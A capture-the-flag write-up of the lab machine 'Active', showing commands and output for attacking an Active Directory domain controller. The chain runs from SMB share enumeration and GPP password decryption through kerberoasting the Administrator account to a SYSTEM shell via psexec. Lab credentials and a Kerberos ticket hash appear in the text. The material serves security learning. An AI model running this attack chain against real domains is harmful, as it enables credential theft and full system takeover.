# Active - Writeup

## Services
```bash
# Nmap 7.94 scan initiated Mon Jul 17 19:12:36 2023 as: nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49154,49155,49157,49158,49171,49175,49176 -o nmap/tcp-script 10.129.158.80
Nmap scan report for 10.129.158.80
Host is up (0.057s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 23:12:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
49176/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-17T23:13:38
|_  start_date: 2023-07-17T22:48:24
|_clock-skew: -1s
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 17 19:13:46 2023 -- 1 IP address (1 host up) scanned in 70.72 seconds
```
This device is running DNS (53), LDAP(389), and Kerberos(88) which means we can infer that it is a DC in an Active Directory Domain.

Also running SMB which we will want to check out.
## Enumeration

We've identifed that the machine is a domain controller, now our next step in the Methodology is enumerating AD usernames.

### Kerbrute

We will being using kerbrute to enumerate usernames from the DC with a user list. Kerbrute brute forces kerberos' pre-authentication phase. Failures at this stage do not tend to trigger logs or alerts so it is a stealthier option. 

The pre-authentication phase of kerberos is used to prove a requestors identity so that they may receive an encrypted TGT from the KDC. The requestor will send a username in the AS-REQ request and the DC will reply with an AS-REP if the user exists or an error if not. By observing the responsed to the requests sent an attacker can determine if the usernames exist or not.

```bash
└─$ ./kerbrute_linux_amd64 userenum -d ACTIVE.HTB --dc 10.129.159.68 /usr/share/wordlists/jsmith.txt -o ~/htb/box/active/userenum.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 07/18/23 - Ronnie Flathers @ropnop

2023/07/18 19:44:40 >  Using KDC(s):
2023/07/18 19:44:40 >   10.129.159.68:88

2023/07/18 19:49:58 >  Done! Tested 48705 usernames (0 valid) in 318.015 seconds
```
No usernames were enumerated in the kerbrute attempt, so thats a dead end on username enum.


### SMB

We can list all the shares on the smb server:
```bash
└─$ smbclient -L \\$IP
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.159.68 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We can user smbmap to list all the shares and their permissions:
```bash
└─$ smbmap -H $IP
[+] IP: 10.129.159.68:445       Name: 10.129.159.68
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
```
We can use smbmap `-R` to recurse throught the directories on the server and get a list of all the files:
```bash
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
```
It returns this `Groups.xml` file which contains information about local groups that have been configured through GPO. Up until 2014 this file was a security concern because it stored sensitive information like passwords that were slightly obfuscated.

This file is Group Policy Preferences (GPP) file used to manage the settings of user and groups in an ad environment. Since this file is stored using GPP, we can easily decrypt it with the `gpp-decrypt` tool.

We get a username and hash from the groups.xml file and can use the tool to decrypt the hash.
```bash
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

The username was `SVC_TGS` and the password is `GPPstillStandingStrong2k18`

We can use our new found creds to query the DC for users by using `GetADUsers.py` or `rpcclient`:
```bash
└─$ python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -dc-ip $IP active.htb/svc_tgs
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Querying 10.129.159.68 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2023-07-18 19:29:00.326938
Guest                                                 <never>              <never>
krbtgt                                                2018-07-18 14:50:36.972031  <never>
SVC_TGS                                               
```
```bash
└─$ rpcclient -U SVC_TGS $IP
Password for [WORKGROUP\SVC_TGS]:
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
```
We can also use `smbmap` again to test if we gained more permissions with the creds:
```bash
└─$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H $IP
[+] IP: 10.129.159.68:445       Name: 10.129.159.68
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```
We can find the `user` flag inside the Users share with `-R` flag

#### Quick aside about the SYSVOL share
I'm new to attacking active directory domains, so I take any chance I can to dive into a relevant topic.
SYSVOL is a domain wide-share in AD that is accessible(read) to all authenticated users. This share contains **logon scripts, group policy data**, and other domain-wide data which needs to be available on all DC's (SYSVOL is automatically synchronized and shared on all DC's).


If we enumerate this share like we did with Replicatoin we would see the `Groups.xml` file again along with other GPP files. When a new GPP file is created, theses an associated xml file created in SYSVOL with relevant config data and if there is a password provided, it's an AES-256 bit encrypted which would be fine except Windows leaked their own encryption key.

Attackers could search this share for xml files including `cpassword`, which is the value that contains the AES encrypted password. 


### Kerberoasting
Kerberoasting is when an authenticated user requests a service ticket for an SPN from the KDC and then takes the service ticket and attempts to brute-force it offline. An SPN or (Service Principal Name), is a unique identifier for services running on servers. When a client wants to connect to a service it does the following:
* Identifies the SPN of the service
* Requests a service ticket from the KDC with it's TGT 
* The KDC returns a service ticket that is encrypted with the service accounts NTLM hash
* The client presents the service ticket to the service and it decrypts the ticket and determines if the client gets access.

The point of kerberoasting is not to get access to the service requested, but to get passwords to the service accounts offering those services. The steps of kerberoasting are as follows:
* Identify service accounts SPN's
* Request a service ticket from the KDC
* Take service ticket offline and attempt to crack the hash to get the service accounts password

In the active.htb domain, the administrator account has an SPN. We can query for service accounts SPN's using another impacket script `GetUserSPNs.py`:
```bash
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP active.htb/SVC_TGS
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-07-19 20:14:05.795844
```

Administrator's SPN is active/CIFS:445, or Common Internet File System, which is a network file sharing protocol. This is the service that allows file sharing over a network.

Now that we have the admin SPN we can request a (TGS)service ticket from the KDC with the same impacket script and the `-request-user` flag.
```bash
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP active.htb/SVC_TGS -request-user Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-07-19 20:14:05.795844



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0cd24951d89e405bbe94e54d5e388669$e38e32ee2bdc2a52837433332ed01d054c38146a4412b8f8a46950b32e3dd5405021f32519596a440ec916bba9cf0230746bdeadb04c2ce77e04d66b9d5d9724b68487e1f234cb494380d098650804a8060876e5be4d4b0995c09e0e4a92cb40a72ffb694e0694b19dc96c74b0383e9c349da7e7619605ddc2c09443297052725888fb88dc42a93d3488e881ff4ce5869074e30623f9700563186fc6c63bde2d0c527f8a7d2732e032c67365cbc48a0eb0f3a8e58ec1a98fb01366026b8af8c741ee167a287b7f7cb09198beee2911f21b4835d8a01e2f03aca2a39c4e481486e0d52cc7af4708ccb73660626c26ce973b69e7097662a9c0704f7149064f0d03b4e772cc17f9ac48a17611019b5bee65a66556558bd8f22d0b8146d52e85fb450aa1886b755621c50c946c9b159362deaf77373264ea36ff13169e809a1e729c08fec2dd9012a375e3ebd743c2a682e59280641e7902b1f26288b7de5268cafaef85802c1d60ae9101d2a68e41f744c6cfc91dfa39711a95e6857aff57a47fc130f5e1f08e372af35d60b1af0975d41d7e536d2850b55e1bb9248706a2a3de4b94288f0c69bf8e064112e2bd6e66ed756e1f828f35dbd0024ae101e994d79747eeba418987227610767712ce35d00fcbaf3fe3ab03969457d9eed32bba05c24b7a27987ff5c0447c03c6fe2dcdbe12cdf0d16ce6a57f23e11d867646614fe7294c6e623149da263bb4365622de8fb3c950608073ae1000b2c32f087bfafeb68206afe4da6e2f7c1b3c810c9b77d95ff306d521e423668cfd60f8d7a5921b8ffe653a0677e1d9796670b5961e7b5d8797f20990e75913bcc834860714af13e27e22110973b0887ece3be273eb38c7f18e3c9f0d49e96e73b44ce98957095de77f9110d5e9963d7f87033b1cfbc599b87d6093ba1319a186eeca95710eb1c7dfe336091efcdb500efd4c66d6356acda7e85a81decfc9522118c481c05a28f24d68c96a9416563c27a181c5cab452dfddad7bf4fe8ccf5dd5806c35b875d1bee13e176a4fa238c471c0d1029ac81167130c4c238bf04ae3775c2f26219fced33b5f3188a65f2b5d95c8f286e8ee534b2ba30a301c6d715d1922910590d9bf37725c10dec95099a0731be0c385441c4ff1c6cc7f210e5e552627a21ea29d28c8e5751ef88c6a02504612dacae23959bf26944476872f4818edcd289edb388a93c3361f2fa7321d6750d2bac1bccb67f393b2fdbcc06695a95d839cba
```

We successfully crack this hash in hashcat with mode 13100 for kerberos 5 and the password is `Ticketmaster1968`

Now we can use the admin credentials and get the C$ share on the smb server or use psexec to get a shell:
```bash
└─$ smbmap -u Administrator -p Ticketmaster1968 -H $IP
[+] IP: 10.129.159.68:445       Name: 10.129.159.68
[-] Work[!] Unable to remove test directory at \\10.129.159.68\SYSVOL\WVZQNJODRI, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE     Logon server share
        Users                                                   READ ONLY
```
**psexec.py**
```bash
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/administrator@$IP
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.159.68.....
[*] Found writable share ADMIN$
[*] Uploading file cqObyyDS.exe
[*] Opening SVCManager on 10.129.159.68.....
[*] Creating service hLrd on 10.129.159.68.....
[*] Starting service hLrd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
